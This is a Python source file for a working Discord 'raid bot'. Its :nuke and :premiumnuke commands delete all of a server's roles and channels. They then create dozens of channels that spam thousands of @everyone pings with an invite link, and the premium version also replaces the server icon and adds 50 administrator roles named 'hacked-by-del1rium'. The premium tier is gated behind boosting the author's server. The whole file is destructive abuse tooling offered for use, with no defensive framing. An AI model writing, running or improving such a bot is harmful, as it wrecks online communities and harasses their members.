import discord
from discord.ext import commands
import asyncio
import os
import aiohttp
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# --- CONFIGURATION ---
CENTRAL_SERVER_ID = 1453920087194206394  # IMPORTANT: REPLACE THIS with your main server's ID!!
PREMIUM_ROLE_ID = 1458177413325259035      # IMPORTANT: REPLACE THIS with your premium role ID!!
OWNER_ID = 1450919094202269881              # IMPORTANT: REPLACE THIS with your User ID!!

# --- NUKE COMMAND TEXTS & CONFIG ---
NORMAL_NUKE_TEXT = "@everyone raid by del1rium https://discord.gg/cJJJWHfnn2"
PREMIUM_CHANNEL_NAME = "premium-raid"
PREMIUM_SPAM_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2"
RAID_ICON_URL = "https://i.imgur.com/x203v9a.jpeg"

# Bot setup
intents = discord.Intents.all()
# Remove the default help command to create our own
bot = commands.Bot(command_prefix=':', intents=intents, help_command=None)

# --- PREMIUM CHECK FUNCTION ---
def is_premium():
    async def predicate(ctx):
        if ctx.author.id == OWNER_ID:
            return True
        central_server = bot.get_guild(CENTRAL_SERVER_ID)
        if not central_server:
            return False
        member_in_central = central_server.get_member(ctx.author.id)
        if not member_in_central or not any(role.id == PREMIUM_ROLE_ID for role in member_in_central.roles):
            await ctx.send("Access Denied: This is a premium command.", delete_after=10)
            return False
        return True
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f'Raid Bot connected as {bot.user.name}')
    print(f'Owner ID: {OWNER_ID} | Protected Server: {CENTRAL_SERVER_ID}')
    print('Commands: :help, :nuke, :premiumnuke, :nukeconfig')

# --- NEW AESTHETIC HELP COMMAND ---
@bot.command(name='help')
async def custom_help(ctx):
    """Displays a professional help embed for the bot's commands."""
    await ctx.message.delete()

    embed = discord.Embed(
        title="Bot Command Manual",
        description="This bot provides both public and premium raiding capabilities.",
        color=discord.Color.from_rgb(47, 49, 54) # Dark theme color
    )

    # Public Commands
    embed.add_field(
        name="Public Commands",
        value=(
            f"`:nuke`\n"
            f"Initiates a standard raid. This command is public and has fixed parameters.\n"
            f"*Channels: 25, Pings: 500*"
        ),
        inline=False
    )

    # Premium Commands
    embed.add_field(
        name="Premium Commands",
        value=(
            f"`:premiumnuke`\n"
            f"Initiates a much larger and more destructive raid with additional features.\n"
            f"*Channels: 50, Pings: 1000, Icon Change, Role Spam*\n\n"
            f"`:nukeconfig <name> <text>`\n"
            f"Configures the channel names and spam text for the `:premiumnuke` command."
        ),
        inline=False
    )

    embed.set_footer(text="Access to premium commands is granted by boosting the main server.")
    embed.set_thumbnail(url="https://i.imgur.com/kair9A0.png") # You can change this to your bot's logo

    help_message = await ctx.send(embed=embed)
    await asyncio.sleep(60) # The help message will be deleted after 60 seconds
    await help_message.delete()

# --- NUKE COMMANDS (WITH CORRECTED PARAMETERS) ---
@bot.command(name='nuke')
async def nuke_normal(ctx):
    """Public command: 25 channels, 500 pings."""
    if ctx.guild.id == CENTRAL_SERVER_ID:
        await ctx.send("Action Blocked: Nuke commands are disabled in this server.", delete_after=10)
        return
    if not ctx.guild.me.guild_permissions.administrator:
        return
    
    print(f"Initiating STANDARD NUKE in: {ctx.guild.name} by {ctx.author.name}")
    await execute_nuke(ctx, "raid-by-del1rium", NORMAL_NUKE_TEXT, 25, 500, is_premium=False)
    print(f"Standard Nuke finished for {ctx.guild.name}.")

@bot.command(name='premiumnuke')
@is_premium()
async def premium_nuke(ctx):
    """Premium command: 50 channels, 1000 pings."""
    if ctx.guild.id == CENTRAL_SERVER_ID:
        await ctx.send("Action Blocked: Nuke commands are disabled in this server.", delete_after=10)
        return
    if not ctx.guild.me.guild_permissions.administrator:
        return
        
    print(f"Initiating PREMIUM NUKE in: {ctx.guild.name} by {ctx.author.name}")
    await execute_nuke(ctx, PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT, 50, 1000, is_premium=True)
    print(f"Premium Nuke finished for {ctx.guild.name}.")

# --- CONFIGURATION COMMAND (PREMIUM) ---
@bot.command(name='nukeconfig')
@is_premium()
async def nuke_config(ctx, channel_name: str, *, spam_text: str):
    """Configures the text for the :premiumnuke command."""
    if ctx.guild.id == CENTRAL_SERVER_ID:
        await ctx.send("Command Disabled: This command cannot be used in the main server.", delete_after=10)
        return

    global PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT
    PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT = channel_name, spam_text
    
    await ctx.message.delete()
    embed = discord.Embed(title="Premium Nuke Configuration Updated", color=discord.Color.gold())
    embed.add_field(name="Channel Name Format", value=f"`{channel_name}-X`", inline=False)
    embed.add_field(name="Spam Text", value=f"```{spam_text}```", inline=False)
    confirmation_msg = await ctx.send(embed=embed)
    await asyncio.sleep(15)
    await confirmation_msg.delete()

# --- CENTRAL NUKE LOGIC ---
async def execute_nuke(ctx, channel_name, spam_text, num_channels, num_pings, is_premium: bool):
    guild = ctx.guild
    destruction_tasks = [*(role.delete() for role in guild.roles if not role.is_default() and not role.managed), *(channel.delete() for channel in guild.channels)]
    if is_premium:
        destruction_tasks.append(execute_premium_actions(guild))
    await asyncio.gather(*destruction_tasks, return_exceptions=True)
    spam_tasks = [create_and_spam(guild, channel_name, spam_text, i, num_pings) for i in range(num_channels)]
    await asyncio.gather(*spam_tasks)

# --- HELPER FUNCTIONS ---
async def create_and_spam(guild, channel_name, spam_text, index, num_pings):
    try:
        channel = await guild.create_text_channel(f'{channel_name}-{index+1}')
        await spam_pings(channel, spam_text, num_pings)
    except Exception: pass

async def spam_pings(channel, spam_text, amount):
    for _ in range(amount):
        try:
            asyncio.create_task(channel.send(spam_text))
            await asyncio.sleep(0.1)
        except Exception: break

async def execute_premium_actions(guild):
    premium_tasks = [change_server_icon(guild), create_chaotic_roles(guild)]
    await asyncio.gather(*premium_tasks, return_exceptions=True)

async def change_server_icon(guild):
    try:
        async with aiohttp.ClientSession() as session, session.get(RAID_ICON_URL) as resp:
            if resp.status == 200: await guild.edit(icon=await resp.read(), reason="Premium Nuke")
    except Exception: pass

async def create_chaotic_roles(guild):
    role_tasks = [guild.create_role(name=f"hacked-by-del1rium-{i}", permissions=discord.Permissions(administrator=True), color=discord.Color.random()) for i in range(50)]
    await asyncio.gather(*role_tasks, return_exceptions=True)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        print(f"Premium access denied for user: {ctx.author.name}")
    else:
        pass

if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("Error: DISCORD_TOKEN is not configured.")

